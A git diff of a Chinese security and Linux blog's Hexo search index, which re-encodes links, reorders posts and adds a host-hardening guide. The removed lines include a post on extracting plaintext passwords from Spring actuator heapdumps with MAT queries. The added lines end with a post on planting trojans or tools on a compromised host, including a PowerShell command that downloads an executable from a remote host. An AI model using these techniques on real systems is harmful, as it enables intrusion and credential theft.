@@ -17,7 +17,7 @@
 <h3 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h3><p>有些事情做起来没什么难度，但你的想法、思考很重要…获取源码方式，请公众号内回复’CVE’即可</p>
 <hr>
 <p>参考链接：</p>
-<p><a href="https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement</a><br><a href="https://work.weixin.qq.com/api/doc">https://work.weixin.qq.com/api/doc</a></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9udmQubmlzdC5nb3YvR2VuZXJhbC9OZXdzL05ldy1OVkQtQ1ZFLUNQRS1BUEktYW5kLVNPQVAtUmV0aXJlbWVudA==">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93b3JrLndlaXhpbi5xcS5jb20vYXBpL2RvYw==">https://work.weixin.qq.com/api/doc<i class="fa fa-external-link-alt"></i></span></p>
 ]]></content>
       <categories>
         <category>Penetration</category>
@@ -26,11 +26,71 @@
   <entry>
     <title>Hexo部署到Github文件夹大小写问题</title>
     <url>/2022/Hexo%E9%83%A8%E7%BD%B2%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98.html</url>
-    <content><![CDATA[<p>​    今天写完博客上传<a href="https://so.csdn.net/so/search?q=github">github</a>时，发现Linux标签404了，上Github仓库一看发现<strong>categories</strong>文件夹下的Linux是小写的，访问&#x2F;categories&#x2F;linux&#x2F;，无法正常显示</p>
+    <content><![CDATA[<p>​    今天写完博客上传<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWI=">github<i class="fa fa-external-link-alt"></i></span>时，发现Linux标签404了，上Github仓库一看发现<strong>categories</strong>文件夹下的Linux是小写的，访问&#x2F;categories&#x2F;linux&#x2F;，无法正常显示</p>
 <p>![image-20220110130828002](&#x2F;Users&#x2F;tbo&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220110130828002.png)</p>
 <p><strong>原因</strong><br>查询资料发现，git是默认不区分大小写的，有时候传到Github上是不会将小写改为大写的。</p>
 <p><strong>解决方法</strong></p>
 <p>进入.git文件夹，将config文件的 <code>ignorecase=true</code> 改为 <code>ignorecase=false</code>。</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux主机安全配置规范</title>
+    <url>/2021/Linux%E5%9F%BA%E7%BA%BF.html</url>
+    <content><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 配置口令生存周期</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 配置密码复杂度策略</strong></p>
+<p>  CentOS系统：修改&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件, 在ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<span id="more"></span><br>例如：password requisite pam_cracklib.so ucredit&#x3D;-1 lcredit&#x3D;-1 dcredit&#x3D;-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p>
+<p><strong>4 限定用户su到root</strong></p>
+<p>  编辑su文件(vi &#x2F;etc&#x2F;pam.d&#x2F;su)，在开头添加下面两行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group=wheel</span><br></pre></td></tr></table></figure>
+
+<p>这表明只有wheel组的成员可以使用su命令成为root用户。</p>
+<h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在文件/etc/profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 设置命令行界面超时退出</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/profile,增加 export TMOUT=300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 禁止root用户远程ssh登录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改/etc/ssh/sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure>
+
+<p><strong>4 启用syslog日志审计</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/rsyslog.conf, 配置: authpriv.* /var/log/secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/vsftpd.conf(或/etc/vsftpd/vsftpd.conf)文件，设置：anonymous_enable=NO</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 禁止root登录VSFTP</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编辑/etc/ftpusers(或/etc/vsftpd/ftpusers)文件，添加root</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p>
+<h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找，find / -maxdepth 3 -name .netrc 2&gt;/dev/null，重命名或者删除</span><br></pre></td></tr></table></figure>
+
+<p><strong>2 删除hosts.equiv文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name hosts.equiv 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><strong>3 删除.rhosts 文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -maxdepth 3 -name .rhosts 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><strong>4 关闭不必要的服务和端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure>
+<p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p>
+<p>删除或重命名”&#x2F;etc”目录下的 issue.net 和 issue 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/issue /etc/issue.bak</span><br><span class="line">mv /etc/issue.net /etc/issue.net.bak</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Linux</category>
@@ -57,7 +117,7 @@
   <entry>
     <title>SSH端口转发</title>
     <url>/2018/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html</url>
-    <content><![CDATA[<h2 id="一、-简述"><a href="#一、-简述" class="headerlink" title="一、 简述"></a><a href="#%E4%B8%80%E3%80%81-%E7%AE%80%E8%BF%B0" title="一、 简述"></a>一、 简述</h2><p>SSH在维基百科的定义：Secure hell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。<span id="more"></span><br>More info: <a href="https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a></p>
+    <content><![CDATA[<h2 id="一、-简述"><a href="#一、-简述" class="headerlink" title="一、 简述"></a><a href="#%E4%B8%80%E3%80%81-%E7%AE%80%E8%BF%B0" title="一、 简述"></a>一、 简述</h2><p>SSH在维基百科的定义：Secure hell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。<span id="more"></span><br>More info: <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvU2VjdXJlX1NoZWxs">SSH<i class="fa fa-external-link-alt"></i></span></p>
 <h3 id="端口转发简述："><a href="#端口转发简述：" class="headerlink" title="端口转发简述："></a><a href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%AE%80%E8%BF%B0%EF%BC%9A" title="端口转发简述："></a>端口转发简述：</h3><p>但大多数人不知道的是SSH还能提供端口转发，并提供相应的加密及解密服务这也被称为“隧道”(tunneling)，而该功能在可以在有防火墙限制时，转发其它TCP流量来通过SSH端口传输，也就实现了“翻墙”。<br>1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。<br>2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。<br><img src="/images/upload/2018-08-251.jpg"><br>如上图所示，TCP端口A和B并不直接通信，而是转发到SSH client及SSH server来进行通信，从而实现了数据加密<br>同时可以绕过防火墙的限制。</p>
 <hr>
 <h2 id="二、-本地转发与远程转发"><a href="#二、-本地转发与远程转发" class="headerlink" title="二、 本地转发与远程转发"></a><a href="#%E4%BA%8C%E3%80%81-%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E4%B8%8E%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91" title="二、 本地转发与远程转发"></a>二、 本地转发与远程转发</h2><h3 id="本地转发示例："><a href="#本地转发示例：" class="headerlink" title="本地转发示例："></a><a href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%E7%A4%BA%E4%BE%8B%EF%BC%9A" title="本地转发示例："></a>本地转发示例：</h3><p>现在假设Server上某个端口的服务不能被远程连接，但它的SSH端口却可以连接，那此时我们就可以通过SSH隧道建立本地转发来连接Server上的端口。<br>本地转发的命令格式：</p>
@@ -148,7 +208,7 @@
     <title>Sublime Text3无法安装包解决</title>
     <url>/2018/Sublime-Text3%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E5%8C%85%E8%A7%A3%E5%86%B3.html</url>
     <content><![CDATA[<p>最近学习GO语言用package control安装插件时，一直报错如下图：<br><img src="/images/upload/2019-02-282.png" alt="报错图片1"><br><img src="/images/upload/2019-02-281.png" alt="报错图片2"><br>看样子是channel_v3.json这个文件不能访问，然后将解决办法汇总如下。<span id="more"></span></p>
-<h2 id="1-利用github"><a href="#1-利用github" class="headerlink" title="1.利用github"></a><a href="#1-%E5%88%A9%E7%94%A8github" title="1.利用github"></a>1.利用github</h2><p>通过官方下载最新的channel_v3文件，上传到自己的Github，然后修改Package Control的channels。<br>官方:<a href="https://packagecontrol.io/channel_v3.json">channel_v3.json</a><br>有该问题且嫌麻烦的伙伴可以使用我的地址：</p>
+<h2 id="1-利用github"><a href="#1-利用github" class="headerlink" title="1.利用github"></a><a href="#1-%E5%88%A9%E7%94%A8github" title="1.利用github"></a>1.利用github</h2><p>通过官方下载最新的channel_v3文件，上传到自己的Github，然后修改Package Control的channels。<br>官方:<span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdlY29udHJvbC5pby9jaGFubmVsX3YzLmpzb24=">channel_v3.json<i class="fa fa-external-link-alt"></i></span><br>有该问题且嫌麻烦的伙伴可以使用我的地址：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
 </pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json</span>
 </pre></td></tr></table></figure>
@@ -252,7 +312,7 @@
 <p>分析日志文件下 2012-05-04 访问页面最高 的前20个 URL 并排序</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access.log |grep &#x27;17/Apr/2021&#x27;| awk &#x27;&#123;print $11&#125;&#x27;|sort|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure>
 
-<p>查询受访问页面的URL地址中 含有 <a href="http://www.abc.com/">www.abc.com</a> 网址的 IP 地址</p>
+<p>查询受访问页面的URL地址中 含有 <span class="exturl" data-url="aHR0cDovL3d3dy5hYmMuY29tLw==">www.abc.com<i class="fa fa-external-link-alt"></i></span> 网址的 IP 地址</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat access_log | awk &#x27;($11~/www.abc.com/)&#123;print $1&#125;&#x27;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
 
 <p>获取访问最高的10个IP地址 同时也可以按时间来查询</p>
@@ -409,7 +469,7 @@
 <p>​    默认情况下使用GitHub Pages的给定域名则支持http和https两种协议，但是如果使用自定义域名的话，则只能通过<code>http://</code>访问，也就是说我们在<code>Github上搭建 Hexo 或Jekyll 主题博客</code>后，通过<code>CNAME</code>绑定个人域名后，我们只能通过<code>http://</code>域名来访问。</p>
 <p>​    如果访问<code>https://XXX.github.io/</code>(即原来的GitHub Pages域名)将会被重定向到<code>我们的自定义域名</code>。但若直接访问<code>https://我们的自定义域名</code>，浏览器会报<code>SSL_DOMAIN_NOT_MATCHED</code>警告。</p>
 <p><u><strong>那么怎么给自己的域名加上<code>https</code>呢？</strong></u></p>
-<p>​    <strong><a href="https://www.cloudflare.com/zh-cn/">CloudFlare</a></strong> 是一家CDN提供商，它提供了<code>免费的https服务</code>(但不是应用SSL证书)。实现模式就是，用户到CDN服务器的连接为<code>https</code>，而CDN服务器到GithubPage服务器的连接为<code>http</code>，就是在CDN服务器那里加上反向代理。</p>
+<p>​    <strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2xvdWRmbGFyZS5jb20vemgtY24v">CloudFlare<i class="fa fa-external-link-alt"></i></span></strong> 是一家CDN提供商，它提供了<code>免费的https服务</code>(但不是应用SSL证书)。实现模式就是，用户到CDN服务器的连接为<code>https</code>，而CDN服务器到GithubPage服务器的连接为<code>http</code>，就是在CDN服务器那里加上反向代理。</p>
 <ol>
 <li>注册并登录CloudFlare，并将自己域名下的<code>name server</code>修改为CloudFlare的<code>name server</code>。</li>
 <li>在CloudFlare的DNS设置域名匹配到自己的GithubPage(启用动态DNS加速)。</li>
@@ -433,7 +493,7 @@
   <entry>
     <title>googlehack</title>
     <url>/2018/googlehack.html</url>
-    <content><![CDATA[<p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。<span id="more"></span><br>More info:<a href="https://www.exploit-db.com/google-hacking-database">Google Hacking</a></p>
+    <content><![CDATA[<p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。<span id="more"></span><br>More info:<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZ29vZ2xlLWhhY2tpbmctZGF0YWJhc2U=">Google Hacking<i class="fa fa-external-link-alt"></i></span></p>
 <h2 id="Google基本关键词"><a href="#Google基本关键词" class="headerlink" title="Google基本关键词"></a><a href="#Google%E5%9F%BA%E6%9C%AC%E5%85%B3%E9%94%AE%E8%AF%8D" title="Google基本关键词"></a>Google基本关键词</h2><p>Intext： 搜索出现的关键词<br>Inurl： 搜索包含关键词的url<br>Intitle： 搜索包含关键词的标题<br>Site： 搜索包含关键词的站点<br>filetype： 搜索包含关键词的文件类型<br>Link： 对于页面包含的外部链接搜索<br>Daterange： 搜索特定的日期范围</p>
 <h2 id="Google基本规则"><a href="#Google基本规则" class="headerlink" title="Google基本规则"></a><a href="#Google%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99" title="Google基本规则"></a>Google基本规则</h2><p>Google 不分大小写<br>Google 可以使用通配符：*表示一个词&#x2F;字<br>Google 会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）<br>最常用的：”关键字” ，双引号会使Google强制搜索包含关键字的内容布尔操作符：AND(+) NOT(-) OR(|)，AND 现在已不需要，多个关键字google会都匹配到</p>
 <h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a><a href="#%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B" title="常用示例"></a>常用示例</h2><h3 id="1、目录列表查找"><a href="#1、目录列表查找" class="headerlink" title="1、目录列表查找"></a><a href="#1%E3%80%81%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE" title="1、目录列表查找"></a>1、目录列表查找</h3><p>目录列表能列出存在于一个web服务器上的文件和目录<br>查找目录列表<br>实例：<br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br>更优化的查找<br>实例：<br>intitle:index.of “parent directory”<br>intitle:index.of name size</p>
@@ -709,24 +769,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux开机和关机记录查看</title>
-    <url>/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</url>
-    <content><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">who</span> -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><span id="more"></span>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">uptime</span></span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Network</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux 查看硬件架构|系统版本|内核版本</title>
     <url>/2020/linux%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p>
@@ -775,13 +817,31 @@
       </categories>
   </entry>
   <entry>
+    <title>Linux开机和关机记录查看</title>
+    <url>/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</url>
+    <content><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">who</span> -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><span id="more"></span>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">uptime</span></span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Network</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>快速切换Node版本</title>
     <url>/2022/node%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[<p>Hexo在使用高版本Node时，会造成Hexo上传报错，而且上传后的项目也可能出现空白页；目前hexo不支持高版本，只能通过降级解决问题。 所以使用到Node版本的切换控制管理。</p>
 <h3 id="一：卸载旧版Node。"><a href="#一：卸载旧版Node。" class="headerlink" title="一：卸载旧版Node。"></a>一：卸载旧版Node。</h3><p>将电脑现在装的node进行卸载，最好是删除所有关于node的文件及内容<span id="more"></span></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew uninstall node@xx</span><br></pre></td></tr></table></figure>
 
-<h3 id="二：安装nvm"><a href="#二：安装nvm" class="headerlink" title="二：安装nvm"></a>二：安装nvm</h3><p>通过Github服务器<a href="https://link.segmentfault.com/?enc=FJ6Vur956hLxUiayc7pItQ==.hiJMKw51zGPIq/rj07K4C5gqBPZ0A/hEZlYsG4X392e2fndpAip1de36a+IycQozbzvmaDKyhI3u2M9feIPVQQ==">下载安装</a></p>
+<h3 id="二：安装nvm"><a href="#二：安装nvm" class="headerlink" title="二：安装nvm"></a>二：安装nvm</h3><p>通过Github服务器<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1GSjZWdXI5NTZoTHhVaWF5YzdwSXRRPT0uaGlKTUt3NTF6R1BJcS9yajA3SzRDNWdxQlBaMEEvaEVabFlzRzRYMzkyZTJmbmRwQWlwMWRlMzZhK0l5Y1FvemJ6dm1hREt5aEkzdTJNOWZlSVBWUVE9PQ==">下载安装<i class="fa fa-external-link-alt"></i></span></p>
 <p>下载完成后，按照安装操作一步一步安装就好了，很简单。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nvm-noinstall.<span class="built_in">zip</span>： 这个是绿色免安装版本，但是使用之前需要配置</span><br><span class="line">nvm-setup.<span class="built_in">zip</span>：这是一个安装包，下载之后点击安装，无需配置就可以使用，方便。</span><br><span class="line">Source code(.<span class="built_in">zip</span>)：<span class="built_in">zip</span>压缩的源码</span><br><span class="line">Sourc code(tar.gz)：tar.gz的源码，一般用于Linux系统</span><br><span class="line">⚠️建议下载nvm-setup.<span class="built_in">zip</span>版本⚠️</span><br></pre></td></tr></table></figure>
 
@@ -801,11 +861,11 @@
     <title>pip更换国内源</title>
     <url>/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html</url>
     <content><![CDATA[<h3 id="pip国内的一些镜像"><a href="#pip国内的一些镜像" class="headerlink" title="pip国内的一些镜像"></a>pip国内的一些镜像</h3><ul>
-<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm">http://mirrors.aliyun.com/pypi/simple/</a></li>
-<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></li>
-<li>豆瓣(douban) <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li>
-<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></li>
-<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
+<li>阿里云 <span class="exturl" data-url="aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9weXBpL3NpbXBsZS8/c3BtPWEyYzZoLjEyODczNjM5LjAuMC4yMmI2MmNkYlZ0WU9abQ==">http://mirrors.aliyun.com/pypi/simple/<i class="fa fa-external-link-alt"></i></span></li>
+<li>中国科技大学 <span class="exturl" data-url="aHR0cHM6Ly9weXBpLm1pcnJvcnMudXN0Yy5lZHUuY24vc2ltcGxlLw==">https://pypi.mirrors.ustc.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
+<li>豆瓣(douban) <span class="exturl" data-url="aHR0cDovL3B5cGkuZG91YmFuLmNvbS9zaW1wbGUv">http://pypi.douban.com/simple/<i class="fa fa-external-link-alt"></i></span></li>
+<li>清华大学 <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnR1bmEudHNpbmdodWEuZWR1LmNuL3NpbXBsZS8=">https://pypi.tuna.tsinghua.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
+<li>中国科学技术大学 <span class="exturl" data-url="aHR0cDovL3B5cGkubWlycm9ycy51c3RjLmVkdS5jbi9zaW1wbGUv">http://pypi.mirrors.ustc.edu.cn/simple/<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <p><u>提示：若担心安全问题可使用HTTPS加密源</u></p>
 <h3 id="修改源的方法"><a href="#修改源的方法" class="headerlink" title="修改源的方法"></a>修改源的方法</h3><h4 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h4><p>Linux Mac Windows通用命令<span id="more"></span></p>
@@ -845,31 +905,6 @@
 ]]></content>
       <categories>
         <category>Programming</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MAT 查找 spring heapdump中的密码明文</title>
-    <url>/2020/spring.html</url>
-    <content><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，&#x2F;jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 &#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
-<h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>
-
-<p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p>
-<img src="../images/upload/2020110501.png" style="zoom: 33%;" />
-
-<span id="more"></span>所以也可以用
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p>
-<img src="../images/upload/2020110502.png" style="zoom: 33%;" />
-
-<p>所以也可以用</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Penetration</category>
       </categories>
   </entry>
   <entry>
@@ -943,64 +978,99 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux主机安全配置规范</title>
-    <url>/2021/Linux%E5%9F%BA%E7%BA%BF.html</url>
-    <content><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure>
+    <title>shell中文件下载方法</title>
+    <url>/2020/shell%E4%B8%8B%E8%BD%BD.html</url>
+    <content><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
+<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.1.1/1.exe&#x27;</span>,<span class="string">&#x27;C:\test\1.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><strong>2 配置口令生存周期</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure>
